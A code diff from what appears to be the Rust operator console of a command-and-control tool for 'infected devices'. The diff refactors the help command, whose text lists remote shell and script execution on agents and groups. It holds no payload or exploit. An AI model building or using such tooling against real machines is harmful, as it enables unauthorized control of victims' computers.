@@ -1,4 +1,5 @@
 use crate::SharedState;
+use strum::{IntoEnumIterator, EnumProperty};
 use talaria::{api::Agent, console::*, protocol::*};
 use std::sync::{Arc, Mutex};
 
@@ -15,7 +16,7 @@ pub async fn evaluate_command(
         Command::Run(run_command) => todo!(),
         Command::Remove { target } => todo!(),
         Command::Clear => todo!(),
-        Command::Help => todo!(),
+        Command::Help => help().await,
     }
 }
 
@@ -320,7 +321,7 @@ async fn status(
 
 
 async fn help() -> Result<ConsoleResponse, ConsoleError> {
-    let output: String = 
+    let mut output: String = 
 r#"---------------------------------------------------------------------------------------------------------------------
  _____          _
 |_   _|_ _ _ __| |_ __ _ _ __ _   _ ___
@@ -333,27 +334,13 @@ Vocab:
     group    | A named collection of infected devices
     target   | Either a single infected device, or a group of infected devices
     <>       | Required argument
-    []       | Optional argument, if connected to a target and the argument is optional, command defaults to target
+    []       | Optional argument. Will default to connected target if applicable
+    ..       | Accepts many arguments of the same type delimited by a space
 ---------------------------------------------------------------------------------------------------------------------
 Commands:
-    connect <target>                                            | Connects to an agent or group 
-    disconnect                                                  | Disconnects from an agent or gropu
-    create_group <group_name> <agent1> <agent2>                 | Creates a group
-    delete_group <group_name>                                   | Deletes a group
-    add_agents_to_group <group_name> <agent1> <agent2>          | Adds agents to a group
-    remove_agents_from_group <group_name> <agent1> <agent2>     | Removes agents from a group
-    exec [target] <command>                                     | Executes a shell command on an agent or group
-    eval [target] <rhai>                                        | Executes rhai code on an agent or group
-    list                                                        | Lists agents
-    list_groups                                                 | Lists groups
-    ping [target]                                               | Pings an agent or group
-    status [target]                                             | Prints the status of an agent or group
-    nickname [agent] <nickname>                                 | Sets the nickname of an agent
-    clear                                                       | Clears the terminal
-    help                                                        | Displays this message
----------------------------------------------------------------------------------------------------------------------"#
-    .into();
-
+"#.to_string();
+    output.push_str(&Command::help());
+    output.push_str("---------------------------------------------------------------------------------------------------------------------");
     Ok(ConsoleResponse {
         output,
         new_target: NewTarget::NoChange,
